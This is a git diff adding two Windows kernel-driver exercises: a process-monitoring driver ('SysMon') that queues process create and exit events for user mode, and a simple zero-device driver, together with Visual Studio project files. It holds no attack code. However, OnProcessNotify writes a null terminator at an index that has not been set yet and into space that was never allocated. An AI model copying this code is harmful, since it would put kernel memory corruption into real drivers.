++	UNREFERENCED_PARAMETER(RegistryPath);
++	
++	NTSTATUS status = STATUS_SUCCESS; 
++	
++	PDEVICE_OBJECT DeviceObject = NULL;
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\sysmon");
++	BOOLEAN symLinkCreated = FALSE;
++
++	do {
++		
++		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\sysmon");
++		status = IoCreateDevice(DriverObject, 0, &devName,
++			FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);// Creating the device as EXCLUSIVE
++		if (!NT_SUCCESS(status)) {
++			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X)\n", status));
++			break;
++		}
++		DeviceObject->Flags |= DO_DIRECT_IO;
++		status = IoCreateSymbolicLink(&symLink, &devName);
++		if (!NT_SUCCESS(status)) {
++			KdPrint((DRIVER_PREFIX "failed to create sym link (0x%08X)\n",
++				status));
++			break;
++		}
++		symLinkCreated = TRUE;
++		
++		status = PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);
++		if (!NT_SUCCESS(status)) {
++			KdPrint((DRIVER_PREFIX
++				"failed to register process callback (0x%08X)\n",
++				status));
++			break;
++		}
++
++	} while (FALSE);
++	
++	if (!NT_SUCCESS(status)) {
++		if (symLinkCreated) {
++			IoDeleteSymbolicLink(&symLink);
++		}
++		if (DeviceObject) {
++			IoDeleteDevice(DeviceObject);
++		}
++	}
++	Globals_Init(&g_state, 1000);
++
++	DriverObject->DriverUnload = SysMonUnload;
++	DriverObject->MajorFunction[IRP_MJ_CREATE] = SysMonCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SysMonCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_READ] = SysMonRead;
++	return status;
++}
++
++NTSTATUS CompleteRequest(PIRP Irp, NTSTATUS status, ULONG_PTR info) {
++	Irp->IoStatus.Status = status;
++	Irp->IoStatus.Information = info;
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return status;
++}
++
++NTSTATUS SysMonCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++	UNREFERENCED_PARAMETER(DeviceObject);
++	return CompleteRequest(Irp, STATUS_SUCCESS, 0);
++}
++
++NTSTATUS SysMonRead(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
++	UNREFERENCED_PARAMETER(DeviceObject);
++	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);
++	ULONG length = irpSp->Parameters.Read.Length;
++	NTSTATUS status = STATUS_SUCCESS; 
++	ULONG bytes = 0; 
++
++	NT_ASSERT(Irp->MdlAddress);
++
++	PUCHAR buffer = (PUCHAR)MmGetSystemAddressForMdlSafe(Irp->MdlAddress, NormalPagePriority);
++	if (!buffer) {
++		status = STATUS_INSUFFICIENT_RESOURCES;
++	}
++	else {
++		while (TRUE) {
++			PLIST_ENTRY entry = Globals_RemoveItem(&g_state);
++
++			if (entry == NULL)break; //the events are finished 
++			
++			//CONTAINING_RECORD(instance we wanna "cast", the target type, and the name of the field we have)
++			PFullItem info = CONTAINING_RECORD(entry, FullItem, Entry); 
++
++			ULONG size = info->header.Size;//specify the data size
++
++			if (length < (size + sizeof(ItemHeader))) {
++				Globals_AddHeadItem(&g_state, entry);
++				break; 
++			}
++			memcpy((void*)buffer, &info->header, sizeof(ItemHeader));
++			memcpy((void*)(buffer + sizeof(ItemHeader)), &info->data, size);
++			length -= sizeof(ItemHeader);
++			length -= size; 
++			buffer = buffer + sizeof(ItemHeader) + size;
++			bytes = bytes + sizeof(ItemHeader) + size; 
++			ExFreePool(info);
++		}
++	}
++	return CompleteRequest(Irp, status, bytes);
++}
++
++void SysMonUnload(PDRIVER_OBJECT DriverObject) {
++	PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, TRUE);
++	LIST_ENTRY* entry;
++	while ((entry = Globals_RemoveItem(&g_state)) != NULL) {
++		ExFreePool(CONTAINING_RECORD(entry, FullItem, Entry));
++	}
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\sysmon");
++	IoDeleteSymbolicLink(&symLink);
++	IoDeleteDevice(DriverObject->DeviceObject);
++}
++
++void OnProcessNotify(PEPROCESS Process, HANDLE ProcessId,
++	PPS_CREATE_NOTIFY_INFO CreateInfo) {
++	if (CreateInfo) {
++		// process create
++		USHORT allocSize = sizeof(FullItem);
++		USHORT commandLineSize = 0;
++		if (CreateInfo->CommandLine) {
++			commandLineSize = CreateInfo->CommandLine->Length;// commandLineSize in bytes
++			allocSize += commandLineSize;
++		}
++		PFullItem info = (PFullItem)ExAllocatePool2(POOL_FLAG_PAGED, allocSize, DRIVER_TAG);
++		if (info == NULL) {
++			KdPrint((DRIVER_PREFIX "failed allocation\n"));
++			return; 
++		}
++		PItemHeader itemHeader = &info->header;
++		PProcessCreateInfo itemInfo = &info->data.processCreateInfo;
++
++		//filling item header 
++		KeQuerySystemTimePrecise(&itemHeader->Time);
++		itemHeader->Type = ITEM_PROCESS_CREATE;
++		itemHeader->Size = sizeof(ProcessCreateInfo) + commandLineSize;
++
++		//filling item data
++		itemInfo->ProcessId = HandleToULong(ProcessId);
++		itemInfo->ParentProcessId = HandleToULong(CreateInfo->ParentProcessId);
++		itemInfo->CreatingProcessId = HandleToULong(CreateInfo->CreatingThreadId.UniqueProcess);
++		itemInfo->CreatingThreadId = HandleToULong(CreateInfo->CreatingThreadId.UniqueThread);
++
++		if (commandLineSize > 0 && CreateInfo->CommandLine->Buffer) {
++			memcpy(itemInfo->CommandLine, CreateInfo->CommandLine->Buffer, commandLineSize);
++			itemInfo->CommandLine[itemInfo->CommandLineLength] = L'\0';
++			//Storing the number of characters instead of the number of bytes 
++			//is not mandatory but would probably be easier to use by user mode code.
++			itemInfo->CommandLineLength = commandLineSize / sizeof(WCHAR); //cammandLineLength contains the number of characters (and not bytes) of the command line 
++		}
++		else {
++			itemInfo->CommandLineLength = 0; 
++		}	
++		
++		Globals_AddItem(&g_state, &info->Entry);
++
++	}
++	else {
++		// process exit
++		PFullItem info = (PFullItem)ExAllocatePool2(POOL_FLAG_PAGED, sizeof(FullItem), DRIVER_TAG);
++		if (info == NULL) {
++			KdPrint((DRIVER_PREFIX "failed allocation\n"));
++			return;
++		}
++		
++		PItemHeader itemHeader = &info->header;
++		PProcessExitInfo itemInfo = &info->data.processExitInfo;
++
++		//filling item header
++		KeQuerySystemTimePrecise(&itemHeader->Time);
++		itemHeader->Type = ITEM_PROCESS_EXIT;
++		itemHeader->Size = sizeof(ProcessExitInfo);
++		
++		//filling item data 
++		itemInfo->ProcessId = HandleToULong(ProcessId);
++		itemInfo->ExitCode = PsGetProcessExitStatus(Process);
++		
++		Globals_AddItem(&g_state, &info->Entry);
++	}
++}
+\ No newline at end of file
+diff --git a/SysMon/SysMon/SysMon.vcxproj b/SysMon/SysMon/SysMon.vcxproj
+new file mode 100644
+index 0000000..3a343a8
+--- /dev/null
++++ b/SysMon/SysMon/SysMon.vcxproj
+@@ -0,0 +1,106 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|ARM64">
++      <Configuration>Debug</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|ARM64">
++      <Configuration>Release</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <ProjectGuid>{52687C01-2500-4DD3-AE04-CDA7509C9FC1}</ProjectGuid>
++    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
++    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
++    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
++    <Configuration>Debug</Configuration>
++    <Platform Condition="'$(Platform)' == ''">x64</Platform>
++    <RootNamespace>SysMon</RootNamespace>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <PropertyGroup />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++    <Link>
++      <AdditionalOptions>/integritycheck %(AdditionalOptions)</AdditionalOptions>
++    </Link>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <FilesToPackage Include="$(TargetPath)" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="SysMon.c" />
++    <ClCompile Include="Globals.c" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="Globals.h" />
++    <ClInclude Include="SysMonPublic.h" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/SysMon/SysMon/SysMon.vcxproj.filters b/SysMon/SysMon/SysMon.vcxproj.filters
+new file mode 100644
+index 0000000..5f95d55
+--- /dev/null
++++ b/SysMon/SysMon/SysMon.vcxproj.filters
+@@ -0,0 +1,37 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
++    <Filter Include="Driver Files">
++      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
++      <Extensions>inf;inv;inx;mof;mc;</Extensions>
++    </Filter>
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="SysMon.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++    <ClCompile Include="Globals.c">
++      <Filter>Source Files</Filter>
++    </ClCompile>
++  </ItemGroup>
++  <ItemGroup>
++    <ClInclude Include="SysMonPublic.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++    <ClInclude Include="Globals.h">
++      <Filter>Header Files</Filter>
++    </ClInclude>
++  </ItemGroup>
++</Project>
+\ No newline at end of file
+diff --git a/SysMon/SysMon/SysMonPublic.h b/SysMon/SysMon/SysMonPublic.h
+new file mode 100644
+index 0000000..112b126
+--- /dev/null
++++ b/SysMon/SysMon/SysMonPublic.h
+@@ -0,0 +1,60 @@
++#pragma once
++
++typedef enum {
++    ITEM_NONE,
++    ITEM_PROCESS_CREATE,
++    ITEM_PROCESS_EXIT
++} ItemType;
++
++/*
++The ItemHeader structure holds information common to all event types: the type of the event, the
++time of the event (expressed as a 64-bit integer), and the size of the payload. The size is important, as
++each event has its own information.
++*/
++
++typedef struct {
++    ItemType Type;
++    USHORT Size;
++    LARGE_INTEGER Time;
++} ItemHeader, * PItemHeader;
++
++typedef struct {
++    unsigned long ProcessId;
++    unsigned long ExitCode;
++} ProcessExitInfo, * PProcessExitInfo;
++
++typedef struct ProcessCreateInfo {
++    ULONG ProcessId;
++    ULONG ParentProcessId;
++    ULONG CreatingThreadId;
++    ULONG CreatingProcessId;
++    USHORT CommandLineLength;
++    WCHAR CommandLine[1];
++} ProcessCreateInfo, * PProcessCreateInfo;
++
++
++
++/*
++Now, we will define a union to hold different types of event data.
++We use this structure to handle the data generically.
++*/
++
++typedef union {
++    ProcessExitInfo processExitInfo;
++    ProcessCreateInfo processCreateInfo;
++} EventData, * PEventData;
++
++typedef struct {
++    ItemHeader header;  // Embed ItemHeader as a member
++    EventData data;     // Union of event data types
++    LIST_ENTRY Entry;   // LIST_ENTRY for managing in a linked list
++} FullItem, * PFullItem;
++
++/*
++Now you have a single `FullItem` structure that can handle any event type by using the `EventData` union.
++*/
++
++#define DRIVER_PREFIX "SYsMon driver: "
++#define DRIVER_TAG 'msyS'
++
++
+diff --git a/ZeroDriver/ZeroDriver.sln b/ZeroDriver/ZeroDriver.sln
+new file mode 100644
+index 0000000..42778e8
+--- /dev/null
++++ b/ZeroDriver/ZeroDriver.sln
+@@ -0,0 +1,42 @@
++﻿
++Microsoft Visual Studio Solution File, Format Version 12.00
++# Visual Studio Version 17
++VisualStudioVersion = 17.12.35707.178 d17.12
++MinimumVisualStudioVersion = 10.0.40219.1
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ZeroDriver", "ZeroDriver\ZeroDriver.vcxproj", "{B190AADD-C898-4D55-A776-C9FE502AFD02}"
++EndProject
++Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "ZeroTest", "ZeroTest\ZeroTest.vcxproj", "{0279E064-9A17-469A-9847-4ACE803CA697}"
++EndProject
++Global
++	GlobalSection(SolutionConfigurationPlatforms) = preSolution
++		Debug|ARM64 = Debug|ARM64
++		Debug|x64 = Debug|x64
++		Release|ARM64 = Release|ARM64
++		Release|x64 = Release|x64
++	EndGlobalSection
++	GlobalSection(ProjectConfigurationPlatforms) = postSolution
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|ARM64.ActiveCfg = Debug|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|ARM64.Build.0 = Debug|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|ARM64.Deploy.0 = Debug|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|x64.ActiveCfg = Debug|x64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|x64.Build.0 = Debug|x64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Debug|x64.Deploy.0 = Debug|x64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|ARM64.ActiveCfg = Release|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|ARM64.Build.0 = Release|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|ARM64.Deploy.0 = Release|ARM64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|x64.ActiveCfg = Release|x64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|x64.Build.0 = Release|x64
++		{B190AADD-C898-4D55-A776-C9FE502AFD02}.Release|x64.Deploy.0 = Release|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Debug|ARM64.ActiveCfg = Debug|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Debug|ARM64.Build.0 = Debug|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Debug|x64.ActiveCfg = Debug|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Debug|x64.Build.0 = Debug|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Release|ARM64.ActiveCfg = Release|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Release|ARM64.Build.0 = Release|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Release|x64.ActiveCfg = Release|x64
++		{0279E064-9A17-469A-9847-4ACE803CA697}.Release|x64.Build.0 = Release|x64
++	EndGlobalSection
++	GlobalSection(SolutionProperties) = preSolution
++		HideSolutionNode = FALSE
++	EndGlobalSection
++EndGlobal
+diff --git a/ZeroDriver/ZeroDriver/Source.cpp b/ZeroDriver/ZeroDriver/Source.cpp
+new file mode 100644
+index 0000000..52ff115
+--- /dev/null
++++ b/ZeroDriver/ZeroDriver/Source.cpp
+@@ -0,0 +1,102 @@
++#include <ntddk.h>
++
++void ZeroDriverUnload(PDRIVER_OBJECT DriverObject);
++
++NTSTATUS ZeroDriverCreateClose(PDEVICE_OBJECT, PIRP Irp);
++NTSTATUS ZeroDriverRead(PDEVICE_OBJECT, PIRP Irp);
++NTSTATUS ZeroDriverWrite(PDEVICE_OBJECT, PIRP Irp);
++
++extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING) {
++	
++	DriverObject->DriverUnload = ZeroDriverUnload;
++	
++	DriverObject->MajorFunction[IRP_MJ_CREATE] = ZeroDriverCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_CLOSE] = ZeroDriverCreateClose;
++	DriverObject->MajorFunction[IRP_MJ_READ] = ZeroDriverRead;
++	DriverObject->MajorFunction[IRP_MJ_WRITE] = ZeroDriverWrite; 
++
++	PDEVICE_OBJECT DeviceObject;
++	UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\Zero");
++	NTSTATUS status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
++
++	if (!NT_SUCCESS(status)) {
++		KdPrint(("Failed in IoCreateDevice (0x%X)\n", status));
++		return status;
++	}
++
++	// Set DO_DIRECT_IO flag
++	DeviceObject->Flags |= DO_DIRECT_IO;
++
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Zero");
++	status = IoCreateSymbolicLink(&symLink, &devName);
++
++	if (!NT_SUCCESS(status)) {
++		IoDeleteDevice(DeviceObject);
++		KdPrint(("Failed in IoCreateSymbolicLink (0x%X)\n", status));
++		return status;
++	}
++
++	return STATUS_SUCCESS;
++}
++
++
++//do what has been done in DriverEntry, but in reverse
++void ZeroDriverUnload(PDRIVER_OBJECT DriverObject) {
++	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Zero");
++	IoDeleteSymbolicLink(&symLink);
++	IoDeleteDevice(DriverObject->DeviceObject);
++}
++
++NTSTATUS ZeroDriverCreateClose(PDEVICE_OBJECT, PIRP Irp) {
++	Irp->IoStatus.Status = STATUS_SUCCESS;
++	Irp->IoStatus.Information = 0; 
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return STATUS_SUCCESS;
++}
++
++NTSTATUS ZeroDriverRead(PDEVICE_OBJECT, PIRP Irp) {
++	auto stack = IoGetCurrentIrpStackLocation(Irp);
++	ULONG bytes = stack->Parameters.Read.Length;
++
++	// Ensure we have a valid MDL (Direct I/O uses MDLs)
++	PMDL mdl = Irp->MdlAddress;
++	if (mdl == NULL) {
++		Irp->IoStatus.Status = STATUS_INVALID_PARAMETER;
++		Irp->IoStatus.Information = 0;
++		IoCompleteRequest(Irp, IO_NO_INCREMENT);
++		return STATUS_INVALID_PARAMETER;
++	}
++
++	ULONG mdlLength = MmGetMdlByteCount(mdl);
++	if (bytes > mdlLength) {
++		bytes = mdlLength;  // Prevent buffer overrun
++	}
++
++	// Get the system address for the locked pages
++	PVOID buffer = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);
++	if (buffer == NULL) {
++		Irp->IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;
++		Irp->IoStatus.Information = 0;
++		IoCompleteRequest(Irp, IO_NO_INCREMENT);
++		return STATUS_INSUFFICIENT_RESOURCES;
++	}
++	
++	// Zero the buffer
++	RtlZeroMemory(buffer, bytes);
++
++	Irp->IoStatus.Status = STATUS_SUCCESS;
++	Irp->IoStatus.Information = bytes;
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return STATUS_SUCCESS;
++}
++
++NTSTATUS ZeroDriverWrite(PDEVICE_OBJECT, PIRP Irp) {
++	auto stack = IoGetCurrentIrpStackLocation(Irp);
++	ULONG bytes = stack->Parameters.Write.Length;
++	
++	Irp->IoStatus.Status = STATUS_SUCCESS;
++	Irp->IoStatus.Information = bytes;
++	IoCompleteRequest(Irp, IO_NO_INCREMENT);
++	return STATUS_SUCCESS;
++}
++
+diff --git a/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj b/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj
+new file mode 100644
+index 0000000..fd771e7
+--- /dev/null
++++ b/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj
+@@ -0,0 +1,98 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup Label="ProjectConfigurations">
++    <ProjectConfiguration Include="Debug|x64">
++      <Configuration>Debug</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|x64">
++      <Configuration>Release</Configuration>
++      <Platform>x64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Debug|ARM64">
++      <Configuration>Debug</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++    <ProjectConfiguration Include="Release|ARM64">
++      <Configuration>Release</Configuration>
++      <Platform>ARM64</Platform>
++    </ProjectConfiguration>
++  </ItemGroup>
++  <PropertyGroup Label="Globals">
++    <ProjectGuid>{B190AADD-C898-4D55-A776-C9FE502AFD02}</ProjectGuid>
++    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
++    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
++    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
++    <Configuration>Debug</Configuration>
++    <Platform Condition="'$(Platform)' == ''">x64</Platform>
++    <RootNamespace>ZeroDriver</RootNamespace>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>true</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
++    <TargetVersion>Windows10</TargetVersion>
++    <UseDebugLibraries>false</UseDebugLibraries>
++    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
++    <ConfigurationType>Driver</ConfigurationType>
++    <DriverType>WDM</DriverType>
++  </PropertyGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
++  <ImportGroup Label="ExtensionSettings">
++  </ImportGroup>
++  <ImportGroup Label="PropertySheets">
++    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
++  </ImportGroup>
++  <PropertyGroup Label="UserMacros" />
++  <PropertyGroup />
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
++    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
++  </PropertyGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
++    <DriverSign>
++      <FileDigestAlgorithm>sha256</FileDigestAlgorithm>
++    </DriverSign>
++  </ItemDefinitionGroup>
++  <ItemGroup>
++    <FilesToPackage Include="$(TargetPath)" />
++  </ItemGroup>
++  <ItemGroup>
++    <ClCompile Include="Source.cpp" />
++  </ItemGroup>
++  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
++  <ImportGroup Label="ExtensionTargets">
++  </ImportGroup>
++</Project>
+\ No newline at end of file
+diff --git a/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj.filters b/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj.filters
+new file mode 100644
+index 0000000..3510c8e
+--- /dev/null
++++ b/ZeroDriver/ZeroDriver/ZeroDriver.vcxproj.filters
+@@ -0,0 +1,26 @@
++﻿<?xml version="1.0" encoding="utf-8"?>
++<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
++  <ItemGroup>
++    <Filter Include="Source Files">
++      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
++      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
++    </Filter>
++    <Filter Include="Header Files">
++      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
++      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
++    </Filter>
++    <Filter Include="Resource Files">
++      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
++      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
++    </Filter>
